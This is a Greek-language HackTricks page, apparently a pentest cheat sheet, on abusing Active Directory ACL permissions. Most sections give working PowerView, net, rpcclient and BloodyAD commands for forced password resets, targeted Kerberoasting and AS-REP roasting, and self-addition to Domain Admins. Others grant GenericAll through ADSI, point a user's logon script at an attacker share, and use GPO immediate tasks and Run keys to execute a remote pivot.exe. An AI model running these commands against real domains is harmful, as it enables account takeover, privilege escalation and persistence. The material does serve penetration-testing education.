# Κατάχρηση Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Αυτή η σελίδα είναι κυρίως μια σύνοψη των τεχνικών από** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **και** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Για περισσότερες λεπτομέρειες, δείτε τα πρωτότυπα άρθρα.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll Δικαιώματα σε χρήστη**

Αυτό το προνόμιο παρέχει σε έναν επιτιθέμενο πλήρη έλεγχο σε έναν λογαριασμό χρήστη-στόχο. Μόλις τα δικαιώματα `GenericAll` επιβεβαιωθούν χρησιμοποιώντας την εντολή `Get-ObjectAcl`, ο επιτιθέμενος μπορεί:

- **Αλλαγή του Κωδικού του Στόχου**: Χρησιμοποιώντας `net user <username> <password> /domain`, ο επιτιθέμενος μπορεί να επαναφέρει τον κωδικό του χρήστη.
- **Targeted Kerberoasting**: Ανάθεσε ένα SPN στον λογαριασμό του χρήστη για να τον κάνεις kerberoastable, στη συνέχεια χρησιμοποίησε Rubeus και targetedKerberoast.py για να εξάγεις και να προσπαθήσεις να σπάσεις τα hashes του ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Απενεργοποιήστε την pre-authentication για τον χρήστη, καθιστώντας τον λογαριασμό του ευάλωτο σε ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **Δικαιώματα GenericAll σε ομάδα**

Αυτό το προνόμιο επιτρέπει σε έναν επιτιθέμενο να τροποποιεί τα μέλη μιας ομάδας αν έχει δικαιώματα `GenericAll` σε μια ομάδα όπως την `Domain Admins`. Αφού εντοπίσει το distinguished name της ομάδας με το `Get-NetGroup`, ο επιτιθέμενος μπορεί:

- **Προσθήκη του εαυτού τους στην ομάδα Domain Admins**: Αυτό μπορεί να γίνει μέσω άμεσων εντολών ή χρησιμοποιώντας modules όπως Active Directory ή PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Από Linux μπορείτε επίσης να αξιοποιήσετε το BloodyAD για να προσθέσετε τον εαυτό σας σε οποιεσδήποτε ομάδες όταν κατέχετε GenericAll/Write membership επάνω τους. Εάν η στοχευόμενη ομάδα είναι nested μέσα σε “Remote Management Users”, θα αποκτήσετε αμέσως πρόσβαση WinRM σε hosts που εφαρμόζουν αυτήν την ομάδα:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Η κατοχή αυτών των προνομίων σε ένα αντικείμενο υπολογιστή ή σε έναν λογαριασμό χρήστη επιτρέπει:

- **Kerberos Resource-based Constrained Delegation**: Επιτρέπει την απόκτηση ελέγχου ενός αντικειμένου υπολογιστή.
- **Shadow Credentials**: Χρησιμοποιήστε αυτήν την τεχνική για να μιμηθείτε έναν υπολογιστή ή έναν λογαριασμό χρήστη εκμεταλλευόμενοι τα προνόμια για να δημιουργήσετε shadow credentials.

## **WriteProperty on Group**

Εάν ένας χρήστης έχει δικαιώματα `WriteProperty` σε όλα τα αντικείμενα για μια συγκεκριμένη ομάδα (π.χ. `Domain Admins`), μπορεί να:

- **Προσθέσουν τους εαυτούς τους στην ομάδα Domain Admins**: Επιτυγχάνεται με το συνδυασμό των εντολών `net user` και `Add-NetGroupUser`, αυτή η μέθοδος επιτρέπει την κλιμάκωση προνομίων εντός του domain.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Το προνόμιο αυτό επιτρέπει σε επιτιθέμενους να προσθέτουν τους εαυτούς τους σε συγκεκριμένες ομάδες, όπως οι `Domain Admins`, μέσω εντολών που χειρίζονται απευθείας τη συμμετοχή σε ομάδες. Η χρήση της ακόλουθης ακολουθίας εντολών επιτρέπει την αυτο-προσθήκη:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Αυτο-συμμετοχή)**

Ένα παρόμοιο προνόμιο, αυτό επιτρέπει σε επιτιθέμενους να προσθέτουν άμεσα τους εαυτούς τους σε ομάδες τροποποιώντας τις ιδιότητες των ομάδων εάν έχουν το δικαίωμα `WriteProperty` σε αυτές τις ομάδες. Η επιβεβαίωση και εκτέλεση αυτού του προνομίου πραγματοποιούνται με:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Η κατοχή του `ExtendedRight` σε έναν χρήστη για το `User-Force-Change-Password` επιτρέπει την επαναφορά του κωδικού χωρίς να γνωρίζετε τον τρέχοντα κωδικό. Η επαλήθευση αυτού του δικαιώματος και η εκμετάλλευσή του μπορούν να γίνουν μέσω PowerShell ή εναλλακτικών εργαλείων γραμμής εντολών, προσφέροντας διάφορες μεθόδους για την επαναφορά του κωδικού ενός χρήστη, συμπεριλαμβανομένων διαδραστικών συνεδριών και one-liners για μη διαδραστικά περιβάλλοντα. Οι εντολές κυμαίνονται από απλές κλήσεις PowerShell έως τη χρήση του `rpcclient` σε Linux, δείχνοντας την ευελιξία των attack vectors.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner σε ομάδα**

Εάν ένας επιτιθέμενος διαπιστώσει ότι έχει δικαιώματα `WriteOwner` σε μια ομάδα, μπορεί να αλλάξει την ιδιοκτησία της ομάδας στον εαυτό του. Αυτό είναι ιδιαίτερα σημαντικό όταν η ομάδα που εξετάζεται είναι οι `Domain Admins`, καθώς η αλλαγή του ιδιοκτήτη επιτρέπει ευρύτερο έλεγχο των χαρακτηριστικών της ομάδας και της σύνθεσης μελών. Η διαδικασία περιλαμβάνει τον εντοπισμό του σωστού αντικειμένου μέσω του `Get-ObjectAcl` και στη συνέχεια τη χρήση του `Set-DomainObjectOwner` για την τροποποίηση του ιδιοκτήτη, είτε με SID είτε με όνομα.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

Αυτό το δικαίωμα επιτρέπει σε έναν επιτιθέμενο να τροποποιήσει ιδιότητες χρήστη. Συγκεκριμένα, με πρόσβαση `GenericWrite`, ο επιτιθέμενος μπορεί να αλλάξει τη διαδρομή του logon script ενός χρήστη ώστε να εκτελεστεί ένα κακόβουλο script κατά τη σύνδεση του χρήστη. Αυτό επιτυγχάνεται χρησιμοποιώντας την εντολή `Set-ADObject` για να ενημερωθεί η ιδιότητα `scriptpath` του στοχευόμενου χρήστη ώστε να δείχνει στο script του επιτιθέμενου.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Με αυτό το προνόμιο, οι επιτιθέμενοι μπορούν να τροποποιήσουν τη σύνθεση των μελών μιας ομάδας, όπως να προσθέσουν τον εαυτό τους ή άλλους χρήστες σε συγκεκριμένες ομάδες. Η διαδικασία περιλαμβάνει τη δημιουργία ενός αντικειμένου διαπιστευτηρίων, τη χρήση του για την προσθήκη ή αφαίρεση χρηστών από μια ομάδα και την επαλήθευση των αλλαγών στη συμμετοχή με εντολές PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Η κατοχή ενός αντικειμένου AD και η ύπαρξη δικαιωμάτων `WriteDACL` επ’ αυτού επιτρέπουν σε έναν επιτιθέμενο να χορηγήσει στον εαυτό του δικαιώματα `GenericAll` στο αντικείμενο. Αυτό επιτυγχάνεται μέσω χειρισμού ADSI, παρέχοντας πλήρη έλεγχο του αντικειμένου και τη δυνατότητα τροποποίησης της συμμετοχής του σε ομάδες. Παρόλα αυτά, υπάρχουν περιορισμοί όταν επιχειρείται η εκμετάλλευση αυτών των δικαιωμάτων με χρήση του Active Directory module's `Set-Acl` / `Get-Acl` cmdlets.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Αναπαραγωγή στο Domain (DCSync)**

Η επίθεση DCSync εκμεταλλεύεται συγκεκριμένα δικαιώματα replication στο domain για να μιμηθεί έναν Domain Controller και να συγχρονίσει δεδομένα, συμπεριλαμβανομένων των διαπιστευτηρίων χρηστών. Αυτή η ισχυρή τεχνική απαιτεί δικαιώματα όπως `DS-Replication-Get-Changes`, που επιτρέπουν σε επιτιθέμενους να εξάγουν ευαίσθητες πληροφορίες από το AD περιβάλλον χωρίς άμεση πρόσβαση σε Domain Controller. [**Learn more about the DCSync attack here.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Η εκχώρηση δικαιωμάτων για διαχείριση Group Policy Objects (GPOs) μπορεί να παρουσιάσει σημαντικούς κινδύνους ασφαλείας. Για παράδειγμα, αν σε έναν χρήστη όπως ο `offense\spotless` δοθούν δικαιώματα διαχείρισης GPO, μπορεί να έχει προνόμια όπως **WriteProperty**, **WriteDacl**, και **WriteOwner**. Αυτά τα δικαιώματα μπορούν να καταχραστούν για κακόβουλους σκοπούς, όπως εντοπίστηκε με PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Enumerate GPO Permissions

Για να εντοπιστούν λανθασμένα ρυθμισμένα GPOs, τα cmdlets του PowerSploit μπορούν να αλυσιδωθούν. Αυτό επιτρέπει την ανακάλυψη GPOs που ένας συγκεκριμένος χρήστης έχει δικαιώματα να διαχειριστεί: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computers with a Given Policy Applied**: Είναι δυνατό να επιλυθεί ποιους υπολογιστές εφαρμόζει μια συγκεκριμένη GPO, βοηθώντας στην κατανόηση του εύρους του πιθανόυ αντίκτυπου. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Policies Applied to a Given Computer**: Για να δείτε ποιες πολιτικές εφαρμόζονται σε έναν συγκεκριμένο υπολογιστή, μπορούν να χρησιμοποιηθούν εντολές όπως `Get-DomainGPO`.

**OUs with a Given Policy Applied**: Ο εντοπισμός των organizational units (OUs) που επηρεάζονται από μια δεδομένη πολιτική μπορεί να γίνει χρησιμοποιώντας `Get-DomainOU`.

You can also use the tool [**GPOHound**](https://github.com/cogiceo/GPOHound) to enumerate GPOs and find issues in them.

### Abuse GPO - New-GPOImmediateTask

Λανθασμένα ρυθμισμένα GPOs μπορούν να εκμεταλλευτούν για να εκτελέσουν κώδικα, για παράδειγμα, δημιουργώντας ένα immediate scheduled task. Αυτό μπορεί να χρησιμοποιηθεί για να προστεθεί ένας χρήστης στην ομάδα τοπικών administrators στους επηρεαζόμενους υπολογιστές, αυξάνοντας σημαντικά τα προνόμια:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Το GroupPolicy module, αν είναι εγκατεστημένο, επιτρέπει τη δημιουργία και τη σύνδεση νέων GPOs, καθώς και τη ρύθμιση προτιμήσεων όπως registry values για την εκτέλεση backdoors στους επηρεαζόμενους υπολογιστές. Αυτή η μέθοδος απαιτεί το GPO να ενημερωθεί και έναν χρήστη να συνδεθεί στον υπολογιστή για την εκτέλεση:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse προσφέρει μια μέθοδο για να καταχραστείτε υπάρχοντα GPOs προσθέτοντας εργασίες ή τροποποιώντας ρυθμίσεις χωρίς την ανάγκη δημιουργίας νέων GPOs. Αυτό το εργαλείο απαιτεί τροποποίηση των υπαρχόντων GPOs ή χρήση εργαλείων RSAT για τη δημιουργία νέων πριν από την εφαρμογή των αλλαγών:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Εξαναγκαστική Ενημέρωση Πολιτικής

Οι ενημερώσεις των GPO συνήθως γίνονται περίπου κάθε 90 λεπτά. Για να επιταχυνθεί αυτή η διαδικασία, ειδικά μετά την εφαρμογή μιας αλλαγής, μπορεί να χρησιμοποιηθεί στην στοχευόμενη μηχανή η εντολή `gpupdate /force` για να εξαναγκάσει άμεση ενημέρωση πολιτικής. Αυτή η εντολή διασφαλίζει ότι οποιεσδήποτε τροποποιήσεις στα GPO εφαρμόζονται χωρίς να περιμένουν τον επόμενο αυτόματο κύκλο ενημέρωσης.

### Στο Εσωτερικό

Κατά την επιθεώρηση των Scheduled Tasks για ένα συγκεκριμένο GPO, όπως το `Misconfigured Policy`, μπορεί να επιβεβαιωθεί η προσθήκη εργασιών όπως το `evilTask`. Αυτές οι εργασίες δημιουργούνται μέσω scripts ή εργαλείων γραμμής εντολών με σκοπό τη τροποποίηση της συμπεριφοράς του συστήματος ή την ανύψωση προνομίων.

Η δομή της εργασίας, όπως φαίνεται στο XML configuration file που δημιουργείται από το `New-GPOImmediateTask`, περιγράφει τις λεπτομέρειες της scheduled task — συμπεριλαμβανομένης της εντολής προς εκτέλεση και των triggers της. Αυτό το αρχείο δείχνει πώς ορίζονται και διαχειρίζονται οι scheduled tasks μέσα σε GPOs, παρέχοντας έναν τρόπο εκτέλεσης αυθαίρετων εντολών ή scripts ως μέρος της εφαρμογής πολιτικής.

### Χρήστες και Ομάδες

Τα GPOs επιτρέπουν επίσης την αλλαγή μελών χρηστών και ομάδων σε στοχευμένα συστήματα. Επεξεργαζόμενοι απευθείας τα αρχεία πολιτικής Users and Groups, οι επιτιθέμενοι μπορούν να προσθέσουν χρήστες σε προνομιούχες ομάδες, όπως την τοπική ομάδα `administrators`. Αυτό είναι εφικτό μέσω της ανάθεσης δικαιωμάτων διαχείρισης GPO, η οποία επιτρέπει τη τροποποίηση των αρχείων πολιτικής ώστε να συμπεριλαμβάνουν νέους χρήστες ή να αλλάζουν συμμετοχές σε ομάδες.

Το XML configuration file για τα Users and Groups περιγράφει πώς υλοποιούνται αυτές οι αλλαγές. Προσθέτοντας εγγραφές σε αυτό το αρχείο, συγκεκριμένοι χρήστες μπορούν να αποκτήσουν αυξημένα προνόμια σε επηρεαζόμενα συστήματα. Αυτή η μέθοδος προσφέρει μια άμεση προσέγγιση για ανύψωση προνομίων μέσω της χειραγώγησης GPO.

Επιπλέον, μπορούν να ληφθούν υπόψη επιπρόσθετες μέθοδοι για εκτέλεση κώδικα ή διατήρηση persistence, όπως η χρήση logon/logoff scripts, η τροποποίηση registry keys για autoruns, η εγκατάσταση λογισμικού μέσω .msi αρχείων, ή η επεξεργασία ρυθμίσεων υπηρεσιών. Αυτές οι τεχνικές παρέχουν διάφορες οδούς για διατήρηση πρόσβασης και έλεγχο των στοχευμένων συστημάτων μέσω της κατάχρησης των GPOs.

## Αναφορές

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

{{#include ../../../banners/hacktricks-training.md}}
